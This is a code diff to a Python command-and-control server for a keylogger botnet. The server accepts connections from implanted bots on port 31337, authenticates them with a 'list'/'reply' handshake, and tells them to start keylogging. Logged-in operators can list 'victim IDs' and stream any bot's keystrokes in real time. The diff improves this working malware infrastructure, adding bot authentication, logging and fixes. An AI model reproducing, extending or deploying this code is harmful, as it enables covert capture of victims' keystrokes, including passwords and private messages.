@@ -39,6 +39,9 @@ from datetime import datetime
 from random import randint
 
 
+global s
+global st
+
 # LISTS
 logins = ['username:password'] #THIS IS WHERE YOUR ADMIN ACCOUNTS ARE
 user_objects = [] # LIST TO HOLD OBJECTS WHEN THE USERS LOGIN
@@ -79,33 +82,37 @@ dev = ('                ----------Developed by: the.red.team | !help - List comm
 
 # FUNCTION TO START NETWORK CAPABILITIES ON THE SERVER
 def socket_create():
+	global s
+	global st
 	try:
 		host = ''
 		port = 31337 #THE PORT FOR THE BOTS TO CONNECT
 		s = socket.socket()
-		print('[!] Created first socket')
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Created first socket')
 	except socket.error as msg:
-		print('[!]Could not create socket: ' + str(msg))
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + ']Could not create socket: ' + str(msg))
 	try:
 		host2 = ''
 		port2 = 12345 #THE PORT FOR THE USERS TO CONNECT. MAKE IT WHATEVER #CANNOT BE SAME AS BOT PORT#
 		st = socket.socket()
-		print('[!] Created second socket')
+		st.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Created second socket')
 	except socket.error as msg:
-		print('[!]Could not create socket 2: ' + str(msg))
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + ']Could not create socket 2: ' + str(msg))
 	try:
 		s.bind((host, port))
 		s.listen(5)
-		print('[!] Bound first socket')
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Bound first socket')
 	except socket.error as msg:
-		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + ']Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
 		sys.exit()
 	try:
 		st.bind((host2, port2))
 		st.listen(5)
-		print('[!] Bound second socket')
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Bound second socket')
 	except socket.error as msg:
-		print('[!]Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + ']Could not bind socket: ' + str(msg) + "\n" + "Retrying...")
 		sys.exit()
 
 
@@ -115,7 +122,7 @@ def login(obj):
 	valid = False
 	counte = 0
 	attempts = 0
-	print('[!] Login thread started')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Login thread started')
 	qui = False
 	while valid == False and attempts < 4 and qui == False:
 		br = False
@@ -129,22 +136,24 @@ def login(obj):
 		obj.conn.send(str.encode('password: '))
 		password = str(obj.conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
 		attempts = attempts + 1
-		print('[!] Attempted: ' + str(attempts))
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Attempted: ' + str(attempts))
 		cred = username + ':' + password
 		cred = cred.replace('\n', '').replace('\r', '')
 		with open('ADMINS.txt') as f:
 			from_file = f.readlines()
 
 		for line in from_file:
+			print(line.replace('\n', ''))
 			if line.replace('\n', '') not in logins:
-				logins.append(line)
+				print('Added new login to local list')
+				logins.append(line.replace('\n', ''))
 
-		print('[!] Credentials presented: ' + cred)
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Credentials presented: ' + cred)
 		cont = False
 		if cred in logins:
-			print('[!] Successful ADMIN login')
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Successful ADMIN login')
 			logn = open('login.txt', 'a')
-			logn.write('[!] Successful Administrator login with ' + str(username) + ' from IP: ' + str(addr[0]) + '\n')
+			logn.write('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Successful Administrator login with ' + str(username) + ' from IP: ' + str(obj.ip) + '\n')
 			logn.close()
 			obj.conn.send(str.encode('Valid Administrator Login\n\n\n\n'))
 			time.sleep(2)
@@ -153,12 +162,16 @@ def login(obj):
 
 			# THE USER HAS OFFICIALLY LOGGED IN HERE
 			obj.conn.send(str.encode('\n\n\t\t\t\t\tKey Logger Terminal\n\n' + dev + '\n\n'))
-			print('[!] Sending to a clientHandler thread')
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Sending to a clientHandler thread')
 			valid = True
 			if attempts < 5:
 				obj.uid = str(username)
 				user_objects.append(obj)
-				print('[!] len(user_objects) -> ' + str(len(user_objects)))
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] len(user_objects) -> ' + str(len(user_objects)))
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Logged in users\n------------------------------------')
+				for user in user_objects:
+					print(user.uid)
+				print('------------------------------------')
 				clientHandler(obj)
 			break
 		if attempts >= 4:
@@ -172,18 +185,26 @@ def login(obj):
 # FUNCTION WHICH WILL RECEIVE KEY PRESSES FROM THE BOT
 def botHandler(obj):
 
+	# SEND PROMPT TO BOT
+	prompt = 'keylog'
+	obj.conn.send(str.encode(prompt))
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Send prompt to bot -> ' + str(prompt))
+
+
 	# NAMING CONVENTION FOR KEYLOGS
 	# EXAMPLE FILE NAME: 127_0_0_1_keylog.log
 	file_name = str(obj.ip).replace('.', '_') + '_keylog.log'
 
 	# WHILE LOOP WHICH WILL CONTINUE AS LONG AS THE CLIENT IS CONNECTED
-	print('[!] Key monitor thread started')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Key monitor thread started')
 	while True:
 
 
 		# RECEIVE THE KEYS HERE
 		try:
 			kinder = str(obj.conn.recv(1024).decode('ascii')).replace('\r', '')
+			if ('[ENTER]' in str(kinder)) or (len(str(kinder)) > 1):
+				kinder = str(kinder) + '\n'
 		except:
 			break
 
@@ -200,7 +221,7 @@ def botHandler(obj):
 				user.conn.send(str.encode('' + str(kinder) + ''))
 			except:
 				break
-	print('[!] Stopping key monitor')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Stopping key monitor')
 	bot_objects.remove(obj)
 
 
@@ -209,15 +230,15 @@ def botHandler(obj):
 def clientHandler(obj):
 
 	# HELP MENU FOR THE USER
-	help = '!clear - Clear the screen\n'
+	help = '\n!clear - Clear the screen\n'
 	help = help + '!help - Display this menu\n'
 	help = help + '!ID - List UIDs and IPs of connected bots\n'
 	help = help + '!keyLog <bot id> - Stream bot key strokes in real time\n'
 	help = help + '!keyLog stop <bot id> - Stop streaming bot key strokes in real time\n'
-	help = help + '!exit - Exit your session\n'
+	help = help + '!exit - Exit your session\n\n'
 
 
-	print('[!] Client handler started')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Client handler started')
 
 
 	# WHILE LOOP TO CONITNUOUSLY TAKE COMMANDS FROM USER
@@ -227,14 +248,14 @@ def clientHandler(obj):
 			obj.conn.send(str.encode('[' + str(len(bot_objects)) + ']' + str(obj.uid) + '@KeyLogger> '))
 			cmd = str(obj.conn.recv(1024).decode('ascii')).replace('\n', '').replace('\r', '')
 			if cmd == '!ID':
-				obj.conn.send(str.encode('[!] GETTING VICTIM IDs\n'))
+				obj.conn.send(str.encode('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] GETTING VICTIM IDs\n'))
 				for bot in bot_objects:
-					obj.conn.send(str.encode('Bot ID -> ' + str(bot.uid) + ' | IP -> ' + str(bot.ip)))
+					obj.conn.send(str.encode('Bot ID -> ' + str(bot.uid) + ' | IP -> ' + str(bot.ip) + '\n'))
 			elif cmd == '!clear':
 				obj.conn.send(str.encode(chr(27) + "[2J"))
 			elif cmd == '!help':
 				obj.conn.send(str.encode(help))
-			elif cmd == '!quit':
+			elif cmd == '!exit':
 				obj.conn.close()
 				user_objects.remove(obj)
 				break
@@ -251,12 +272,18 @@ def clientHandler(obj):
 						found = True
 						break
 				if found != True:
-					obj.conn.send(str.encode('[!] Bot ID -> ' + str(id) + ' was not found\n'))
+					obj.conn.send(str.encode('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Bot ID -> ' + str(id) + ' was not found\n'))
 				else:
-					if obj not in target_bot.steam:
+					if obj not in target_bot.stream:
 						target_bot.stream.append(obj)
 					else:
-						obj.conn.send(str.encode('[!] You are already streaming keys from bot ' + str(target_bot.uid)))
+						obj.conn.send(str.encode('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] You are already streaming keys from bot ' + str(target_bot.uid)))
+						
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Streaming users\n------------------------------------')
+				for streamers in target_bot.stream:
+					print(streamers.uid)
+					
+				print('------------------------------------')
 
 
 			# IF STATEMENT TO FIND OUT IF USER WANTS TO STOP STREAMING KEY PRESSES
@@ -270,44 +297,68 @@ def clientHandler(obj):
 						found = True
 						break
 				if found != True:
-					obj.conn.send(str.encode('[!] Bot ID -> ' + str(id) + ' was not found\n'))
+					obj.conn.send(str.encode('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Bot ID -> ' + str(id) + ' was not found\n'))
 				else:
-					if obj in target_bot.steam:
+					if obj in target_bot.stream:
 						target_bot.stream.remove(obj)
 					else:
-						obj.conn.send(str.encode('[!] You were not streaming keys from bot ' + str(target_bot.uid)))
+						obj.conn.send(str.encode('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] You were not streaming keys from bot ' + str(target_bot.uid)))
+						
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Streaming users\n------------------------------------')
+				for streamers in target_bot.stream:
+					print(streamers.uid)
+					
+				print('------------------------------------')
 
 
-		except:
-			print('[!] Client disconnected: ' + username + '')
+		except Exception as e:
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] There was an error -> ' + str(e))
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Client disconnected: ' + obj.uid + '')
 			try:
 				user_objects.remove(obj)
 			except:
-				print('[!] Exception')
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Exception')
 			break
 
 
 # FUNCTION WHICH WILL ALLOW BOTS TO CONNECT TO THE SERVER
 def accept_connections():
-	print('[!] Waiting for CPP bot connections')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Waiting for CPP bot connections')
 	while 1:
-
+	
 		# BUILD BOT OBJECT FROM CONNECTION
 		obj = BotProfile()
 		obj.conn, info = s.accept()
 		obj.ip = str(info[0])
 		obj.conn.setblocking(1)
 		obj.uid = str(randint(10000, 99999))
+		
+		# AUTHENTICATE BOT
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Starting authentication with \'list\'...')
+		try:
+			obj.conn.send(str.encode('list'))
+		except:
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Could not send authentication string')
+		ready = select.select([obj.conn], [], [], 5)
+		if ready[0]:
+			data = obj.conn.recv(1024)
+			if 'reply' in str(data):
+		
 
-		print('\n[+]CPP bot Connection established: ' + obj.ip)
-		print('[!] Starting CPP bot login')
+				print('\n[+]CPP bot Connection established: ' + obj.ip)
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Starting CPP bot login')
 
-		bot_thread = threading.Thread(target = botHandler, args = (obj,))
-		bot_thread.daemon = True
-		bot_thread.start()
+				bot_thread = threading.Thread(target = botHandler, args = (obj,))
+				bot_thread.daemon = True
+				bot_thread.start()
 
-		bot_objects.append(obj)
-		print('[!] len(bot_objects) -> ' + str(len(bot_objects)))
+				bot_objects.append(obj)
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] len(bot_objects) -> ' + str(len(bot_objects)))
+				
+			else:
+				print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Failed authentication -> ' + str(data) + ' | This is not our bot')
+		else:
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Recv timeout | This is not our bot')
 
 		time.sleep(0.5)
 
@@ -325,11 +376,11 @@ def accept_connections_2():
 		print('\n[+]Client Connection established: ' + obj.ip)
 
 		logn = open('login.txt', 'a')
-		logn.write('[!] Got a user connection from: ' + str(clientAddress) + '\n')
+		logn.write('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Got a user connection from: ' + str(obj.ip) + '\n')
 		logn.close()
 
-		print('[!] Starting login thread')
-		user_thread = threading.Thread(target = clientHandler, args = (obj,))
+		print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Starting login thread')
+		user_thread = threading.Thread(target = login, args = (obj,))
 		user_thread.daemon = True
 		user_thread.start()
 
@@ -350,39 +401,37 @@ try:
 
 	# START ACCEPTING CONNECTIONS FROM BOTS
 	t = threading.Thread(target=accept_connections)
-	print('started thread ' + str(threadCount))
 	t.daemon = True
 	t.start()
 
 
 	# START ACCEPTING CONNECTIONS FROM USERS
 	a = threading.Thread(target=accept_connections_2)
-	print('started thread ' + str(threadCount))
 	a.daemon = True
 	a.start()
 
-	print('[!] Started all necessary threads')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Started all necessary threads')
 
 	# KEEP ALIVE
 	waiter()
 except KeyboardInterrupt:
 	lstn = False
-	print('\n[!] Exit process starting...')
-	print('[!] Closing connections...')
+	print('\n[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Exit process starting...')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Closing connections...')
 	for r, conn in enumerate(all_connections):
 		try:
-			print('[!] Closing connection: ' + str(r))
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Closing connection: ' + str(r))
 			down_server(conn)
 		except:
 			print('[CRITICAL] Could not kill connection: ' + str(r))
 			print('[CRITICAL] You may experience problem upon next startup')
 	for l, conn in enumerate(all_clients):
 		try:
-			print('[!] Closing client connection: ' + str(l))
+			print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Closing client connection: ' + str(l))
 			down_server(conn)
 		except:
 			print('[CRITICAL] Could not kill connection: ' + str(l))
 			print('[CRITICAL] You may experience problem upon next startup')
 	s.close()
-	print('[!] Successfully closed all connections')
-	print('[!] Exiting')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Successfully closed all connections')
+	print('[' + str(datetime.now().date()) + '|' + str(datetime.now().time()) + '] Exiting')
